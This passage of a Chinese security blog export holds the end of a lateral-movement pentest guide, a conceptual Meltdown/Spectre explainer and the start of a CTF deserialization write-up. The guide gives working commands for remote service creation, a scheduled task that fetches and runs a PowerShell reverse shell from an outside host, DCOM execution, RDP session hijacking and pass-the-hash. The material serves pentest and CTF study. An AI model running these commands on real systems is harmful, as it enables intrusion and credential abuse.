<span class="token function">sc</span> \\TARGET <span class="token function">start</span> TestService

<span class="token comment" spellcheck="true"># from cobalt</span>
link TARGET

<span class="token comment" spellcheck="true"># clean</span>
<span class="token function">sc</span> \\TARGET delete TestService
</code></pre>
<p>和之前WMI的例子类似，上传一个SMB信标到目标机器，并创建一个服务执行信标，这里需要注意的是这里的信标需要是一个可执行的服务（？）</p>
<h2 id="远程桌面协议"><a href="#远程桌面协议" class="headerlink" title="远程桌面协议"></a>远程桌面协议</h2><table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">No</td>
<td align="left"><code>Remote Desktop Users</code></td>
<td align="left">T1076</td>
</tr>
</tbody></table>
<p>RDP，如果你是一个<code>Remote Desktop Users</code>组中的账户，你也许能适应RDP去登陆到目标系统<br>使用BloodHound的<code>CanRDP</code>可以尝试使用RDP进行登录，查询所有能使用RDP登录其他机器的命令为<br><code>MATCH p=()-[:MemberOf*0..]-&gt;(g:Group)-[r:CanRDP]-&gt;() RETURN p</code></p>
<h2 id="远程PowerShell"><a href="#远程PowerShell" class="headerlink" title="远程PowerShell"></a>远程PowerShell</h2><table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">No</td>
<td align="left"><code>Remote Management Users</code>,<code>Administrators</code></td>
<td align="left">T1028</td>
</tr>
<tr>
<td align="left">使用如下命令可以获取到远程交互式的Powershell</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>Enter-PSSession -Computername TAGRET</code></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">使用<code>Invoke-Command</code>可以以类似的方式执行命令块</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>Invoke-Command -Computername TARGET -ScriptBlock &#123;whoami /priv&#125;</code></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<h2 id="任务管理器"><a href="#任务管理器" class="headerlink" title="任务管理器"></a>任务管理器</h2><table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Yes</td>
<td align="left"><code>Administrators</code></td>
<td align="left">N&#x2F;A</td>
</tr>
</tbody></table>
<p>如果我们拥有远程系统的本地管理员权限，可以在目标机器上创建一个计划任务（定时任务）<br>使用自带的工具<code>schtasks.exe</code></p>
<pre class=" language-powershell"><code class="language-powershell">schtasks <span class="token operator">/</span>create <span class="token operator">/</span>S TARGET <span class="token operator">/</span><span class="token function">SC</span> Weekly <span class="token operator">/</span>RU <span class="token string">"NT Authority\SYSTEM"</span> <span class="token operator">/</span>TN <span class="token string">"STCheck"</span> <span class="token operator">/</span>TR <span class="token string">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"</span>
</code></pre>
<p>参数如下所示</p>
<ul>
<li><code>/S TATGET</code> 指明远端服务器</li>
<li><code>/SC Weekly</code> 设置任务执行间隔</li>
<li><code>/RU</code> 指定任务运行权限</li>
<li><code>/TN</code> 任务名</li>
<li><code>/TR</code> 任务执行的命令</li>
</ul>
<h2 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>PsExec是一个windows命令行工具，其允许管理员在远端机器上运行命令，也是渗透下使用的最多的一种远程命令执行方法（需要用户名和密码登录上去，感觉也就是个ssh）<br>其是Telnet的一个替代工具，如今虽然我们有PowerShell Remoting和Invoke-Command PowerShell工具，但是PsExec仍占据着自己的一席之地<br>其在windowsXP后的系统均受支持（好像不是内置的？）</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Yes</td>
<td align="left"><code>Administrators</code></td>
<td align="left">N&#x2F;A</td>
</tr>
</tbody></table>
<p>想要使用PsExec执行命令，首先需要满足如下条件：</p>
<ul>
<li><code>File and Printer sharing</code>必须启用(445端口开放)</li>
<li><code>ADMIN$</code>分享需要可用</li>
</ul>
<p>使用如下命令可以用PsExec启用一个交互式的命令提示符<br><code>psexec.exe -accepteula \\TARGET cmd.exe</code></p>
<h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>Windows Distributed Component Object Model，Windows分布式组件对象模型</p>
<table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">No</td>
<td align="left"><code>Remote COM Users</code>,<code>Administrators</code></td>
<td align="left">T1175</td>
</tr>
</tbody></table>
<p>使用DCOM作为横向移动的技术意味着我们正在通过RPC（remote procedure call）访问DCOM接口，DCOM接口会绑定在远程系统的一个COM对象上，如果我们找到了一个暴露了代码执行函数的DCOM接口，我们也许能使用这些函数进行横向移动<br>幸运的是，许多研究者已经帮我们找到了合适的DCOM对象，MMC app就是一个通过DCOM暴露了意思的函数的windows应用的例子</p>
<p>如下是一种通过MMC应用在远程机器上执行命令的方法</p>
<pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$a</span> = <span class="token namespace">[System.Activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application.1"</span><span class="token punctuation">,</span><span class="token string">"TARGET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token variable">$a</span><span class="token punctuation">.</span>Document<span class="token punctuation">.</span>ActiveView<span class="token punctuation">.</span>ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token string">"/c hostname > c:\fromdcom.txt"</span><span class="token punctuation">,</span><span class="token string">"7"</span><span class="token punctuation">)</span>
</code></pre>
<p>除了MMC以外，还有很多合适的DCOM对象可以利用，由Cybereason维护了一个很好的收集列表<br><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology</a></p>
<p>在默认情况下，只有Administrator组的用户能够远程访问DCOM对象，然而，在某些情况下，<code>Remote COM User</code>组的用户也有使用远程DCOM执行代码的能力</p>
<p>使用BloodHound可以使用如下命令查看所有可以利用DCOM进行命令执行的机器<br><code>MATCH p=(&#123;owned:true&#125;)-[:MemberOf*0..]-&gt;(g:Group)-[r:ExecuteDCOM|AdminTo]-&gt;() RETURN p</code></p>
<h2 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h2><p>Password Spray，乱翻译的。。感觉有类似的名词，说白了就是拿一个现成的密码撞</p>
<table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">No</td>
<td align="left">N&#x2F;A</td>
<td align="left">T1110</td>
</tr>
</tbody></table>
<p>可以使用DomainPasswordSpray这个工具自动化碰撞，这里要注意的是允许用户输入错误密码的次数，防止账号被锁定导致碰撞中断</p>
<h2 id="文件夹重定向和漫游配置文件"><a href="#文件夹重定向和漫游配置文件" class="headerlink" title="文件夹重定向和漫游配置文件"></a>文件夹重定向和漫游配置文件</h2><p>原文是Folder Redirection and Roaming Profiles，后面这半边翻译不出来<br>在虚拟化或VDI环境中，遇上文件夹重定向和漫游配置文件是非常常见的，这项技术使管理员可以为用户的文件夹配置共享位置，我们所要做的是找到所有的重定向文件夹和漫游配置文件，并确认我们是否能写入它们。由于它们可以是常规共享文件，因此我们应该已经在最初的侦查阶段就确认了它们。<br>可以用来进行横向移动的技术有：</p>
<ul>
<li>后门EXE</li>
<li>投放可以触发连向我们以控制机器的SMB连接的特殊文件</li>
</ul>
<p>关于上述特殊文件的参考文章<br><a href="https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes">LIVING OFF THE LAND: STEALING NETNTLM HASHES</a></p>
<h2 id="RDP劫持"><a href="#RDP劫持" class="headerlink" title="RDP劫持"></a>RDP劫持</h2><table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Yes</td>
<td align="left"><code>Administrators</code></td>
<td align="left">N&#x2F;A</td>
</tr>
</tbody></table>
<p>当你拥有一个其他人用RDP登录上来的机器的管理员权限时，可以在没有他们的凭证的情况下控制他们的RDP会话<br>使用<code>query user</code>命令查看当前活跃的会话（session）<br>为了获取到他人的会话，我们需要使用如下命令创建一个新的服务</p>
<pre class=" language-powershell"><code class="language-powershell"><span class="token function">sc</span> create sessionhijack binpath= <span class="token string">"cmd.exe /c tscon 2 /dest:rdp-tcp#7"</span>
net <span class="token function">start</span> sessionhijack
</code></pre>
<p>参数说明：</p>
<ul>
<li>tscon的值为需要控制的会话ID</li>
<li>&#x2F;dest值为当前我们自己会话的名字</li>
</ul>
<p>（不过他人远程登录到我这上面来了，是不是能直接mimikatz把凭证dump出来）</p>
<h2 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass-the-Hash"></a>Pass-the-Hash</h2><p>哈希传递</p>
<table>
<thead>
<tr>
<th align="left">Requires Admin</th>
<th align="left">Local Group Membership</th>
<th align="left">ATTACK ID</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Yes</td>
<td align="left"><code>Administrators</code></td>
<td align="left">T1075</td>
</tr>
</tbody></table>
<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>经典mimikatz<br><code>sekurlsa::pth /user:.\localadmin /ntlm:HASH /run:cmd.exe</code>获得一个对应用户的cmd</p>
<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><h3 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h3><p>可以通过PtH来远程桌面登录到一个系统上<br>但只在目标型号的操作系统上生效：</p>
<ul>
<li>Windows Server 2012 R2</li>
<li>Windows 8.1<br>使用xfreerdp工具完成攻击<br><code>xfreerdp /u:admin /d:. /pth:hash:hash /v:TARGET</code></li>
</ul>
<h3 id="用户账户控制-amp-用户权限分配"><a href="#用户账户控制-amp-用户权限分配" class="headerlink" title="用户账户控制&amp;用户权限分配"></a>用户账户控制&amp;用户权限分配</h3><p>User Account Control &amp; User Right Assignment<br>UAC中的某些设置可能导致PtH攻击无法生效，见下表</p>
<table>
<thead>
<tr>
<th align="left">EnableLUA</th>
<th align="left">LocalAccountTokenFilterPolicy</th>
<th align="left">FilterAdministratorToken</th>
<th align="left">Effect</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">N&#x2F;A</td>
<td align="left">N&#x2F;A</td>
<td align="left">PtH可以在本地Administrator组和RID500的账户下生效</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">0 (default)</td>
<td align="left">0 (default)</td>
<td align="left">只能对RID为500的默认账户使用PtH</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">0</td>
<td align="left">1</td>
<td align="left">无法使用PtH</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">1</td>
<td align="left">0</td>
<td align="left">可以对任意本地admin组用户使用PtH</td>
</tr>
</tbody></table>
<p>UAC设置可以本地或通过GPO进行配置<br>在本地系统中可以使用<code>Seatbelt</code>工具枚举UAC设置<br><code>Seatbelt.exe UACSystemPolicies</code><br>想要枚举使用GPO配置的UAC设置，可以使用PowerView的工具</p>
<p>windows有另一系列的设置以阻止我们横向移动，比如URA，用户权限分配。<br>URA是当用户登录到系统是分配权限的设置，我们重点关注两个权限:</p>
<ul>
<li><code>SeDenyNetworkLogonRight</code>禁止远程登录</li>
<li><code>SeDenyRemoteInteractiveLogonRight</code>禁止用户远程桌面登录</li>
</ul>
<h3 id="Overpass-the-Hash"><a href="#Overpass-the-Hash" class="headerlink" title="Overpass-the-Hash"></a>Overpass-the-Hash</h3><h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass-the-Ticket"></a>Pass-the-Ticket</h3><p>详见mimikatz</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/">Lateral Movement</a><br><a href="https://www.chabug.org/tools/755.html">Cobalt Strike 几种不常见的上线方式</a><br><a href="https://adamtheautomator.com/psexec/">Psexec: The Ultimate Guide</a><br><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology</a><br><a href="https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes">LIVING OFF THE LAND: STEALING NETNTLM HASHES</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>熔断&amp;幽灵</title>
    <url>/%E7%86%94%E6%96%AD&amp;%E5%B9%BD%E7%81%B5.html</url>
    <content><![CDATA[<h1 id="熔断-amp-幽灵"><a href="#熔断-amp-幽灵" class="headerlink" title="熔断&amp;幽灵"></a>熔断&amp;幽灵</h1><p>上次看浏览器看到CORB的时候提到了熔断和幽灵漏洞，今天刚好遇到了一篇文章讲这个洞的成因，记录一下（总觉得越学方向越奇怪了<br><img src="/images/meltdown.jpg" alt="meltdown"><br>并且这个图我很喜欢，很有感觉</p>
<p>熔断和幽灵两个漏洞的成因基本上是一致的，但在实现上有细微的区别，漏洞的危害是内核任意空间读取</p>
<p>最近又重新回顾了一下，补充一下</p>
<h2 id="熔断"><a href="#熔断" class="headerlink" title="熔断"></a>熔断</h2><p>利用的是InterCPU在进行内存操作时先进行猜想性访问，再判断请求是否合法，如果请求并不合法则进行回滚，内存不会受到任何影响，但缓存会被修改<br>熔断的危害在于可以通过乱序执行访问无法触及的内核资源，熔断了内核和用户态直接的防御，使用KPTI可以使得内核页表尽可能少的暴露在用户态，但每次用户态和内核态的切换需要进行TLB的刷新，且需要存储两份页表，一份残缺的在用户态，一份完整的在内核，增加了资源消耗。<br>但由于仍有必须的内核进入页在用户态可见，因此熔断仍有可能被利用</p>
<h2 id="幽灵"><a href="#幽灵" class="headerlink" title="幽灵"></a>幽灵</h2><p>和熔断类似，也是利用的缓存，但幽灵利用的是分支预测的预先加载完成的攻击，实现难度就熔断而言更难一些<br>幽灵是通过分支预测进行不同进程间的共享内存或是一个进程中不同线程之间进行内存读取，可以进行沙箱逃逸等操作，其并不像熔断越级访问了内核数据，而是进行进程之间的数据读取，绕过软件本身的访问限制，从而KPTI并不能防御幽灵的存在</p>
<h2 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h2><p>以幽灵为例，比如如下这个大致的伪代码</p>
<pre class=" language-C++"><code class="language-C++">char array1[128] = {0,1,2.....127}
char array2[2]
if(int x < limit)
{
    temp = array1[array2+y];
}
else
{
    do something
}
</code></pre>
<p>恶意程序首先多次令x&lt;limit，使得CPU的分支预测认为绝大多数情形都是直接进入if语句，之后的执行再判断if语句时率先执行其中内容而不是等待if判断，而此时CPU会发起对array2+y的内存空间的访问，一般来说这会导致一个数组越界错误，然后进程就挂了。但是，这里是CPU进行分支预测，而数组越界由操作系统内核进行判断，所以CPU就开开心心的读取了这一位数据，并将其作为值访问了array1的数据</p>
<p>攻击的核心就在于分支预测时的缓存加载<br>比如我们令y&#x3D;0x????????，使y足够大以从用户空间直接访问至内核空间数据，CPU在预测时读取了array2+x的地址的数据，并且这个时候也是先进行猜测性读取再进行地址合法性检验，比如是70，再用它来访问array[70]的数据，这个时候array[70]就被放进了cache，而这个时候，x读出来的结果又大于16了，这下CPU回滚操作，但是缓存不会回滚，array[70]就这么进入了缓存中</p>
<p>现在，我们遍历array1的所有元素，发现array[70]的响应速度特别的快。这就意味着array2+y访问的结果是70，也就是说地址为array2+y的空间中的值为70<br>按这个套路，可以逐byte读取任意内存数据</p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>不过进程和进程之间的空间是隔离的，所以好像这个洞没法跨进程读取，但能实现进程内部任意内存读取，如果是病毒程序的话应该就去读内核空间，而浏览器的话就可以用js代码突破沙箱，读取进程的其他数据，比如存在浏览器上的一些用户密码之类的。</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>硬件层面应该先校验内存是否合法再去读取，而不是先去进行猜测性访问再由操作系统校验结果<br>操作系统层面推出了经典的KPTI技术，即内核页表隔离。在用户态时持有的页表不包含完整的内核空间。但这使得系统调用的开销提升了很多，因为进出内核态需要刷新页表<br>Chrome浏览器加了个防护措施是降低某个高精度时间计算函数的精度，让恶意代码看不出来缓存访问变快。还有个啥buffer禁用，忘了具体内容了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.sciencenet.cn/blog-684007-1093420.html">http://blog.sciencenet.cn/blog-684007-1093420.html</a><br><a href="https://rtoax.blog.csdn.net/article/details/114794325">Meltdown(熔断漏洞)- Reading Kernel Memory from User Space&#x2F;KASLR | 原文+中文翻译</a><br><a href="https://xz.aliyun.com/t/6332">深入Spectre V2——跨进程泄露敏感信息</a><br><a href="https://danielmiessler.com/blog/simple-explanation-difference-meltdown-spectre/">A Simple Explanation of the Differences Between Meltdown and Spectre</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>spectre</tag>
        <tag>meltdown</tag>
      </tags>
  </entry>
  <entry>
    <title>祥云杯2021 web wp</title>
    <url>/%E7%A5%A5%E4%BA%91%E6%9D%AF2021%20wp.html</url>
    <content><![CDATA[<h1 id="祥云杯2021-web-wp"><a href="#祥云杯2021-web-wp" class="headerlink" title="祥云杯2021 web wp"></a>祥云杯2021 web wp</h1><p>六个题出了三个，太菜了太菜了。后续看了wp之后感觉唯一的确做不出来的是那个java，因为我真的不会java</p>
<h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>撤回我之前的好评，原来这个题真的是一个百度就能复制粘贴打的题，可惜我觉得链子不难就直接看了。原来这个题出出来就是复制粘贴的<br><a href="https://xz.aliyun.com/t/9948#toc-5">yii 2.0.42 最新反序列化利用全集</a></p>
<p>简单看一下<br>反序列化入口，唯一的<code>__destruct</code></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">RunProcess</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'sleep'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token variable">$events</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$process</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">'[RunProcess] Stopping '</span> <span class="token punctuation">.</span> <span class="token variable">$process</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCommandLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$process</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>唯一的<code>__call</code></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name">DefaultGenerator</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">default</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>唯一的<code>__toString</code></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">AppendStream</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$streams</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$seekable</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"hahaha"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">seek</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">,</span> <span class="token variable">$whence</span> <span class="token operator">=</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">seekable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>RuntimeException</span><span class="token punctuation">(</span><span class="token string">'This AppendStream is not seekable'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$whence</span> <span class="token operator">!==</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>RuntimeException</span><span class="token punctuation">(</span><span class="token string">'The AppendStream can only seek with SEEK_SET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pos</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">current</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">streams</span> <span class="token keyword">as</span> <span class="token variable">$i</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$stream</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token variable">$stream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>RuntimeException</span><span class="token punctuation">(</span><span class="token string">'Unable to seek stream '</span>
                    <span class="token punctuation">.</span> <span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token string">' of the AppendStream'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>中间类</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name">CachingStream</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$remoteStream</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$skipReadBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">seek</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

        <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token variable">$offset</span><span class="token punctuation">;</span>

        <span class="token variable">$diff</span> <span class="token operator">=</span> <span class="token variable">$byte</span> <span class="token operator">-</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$diff</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$diff</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">remoteStream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$diff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
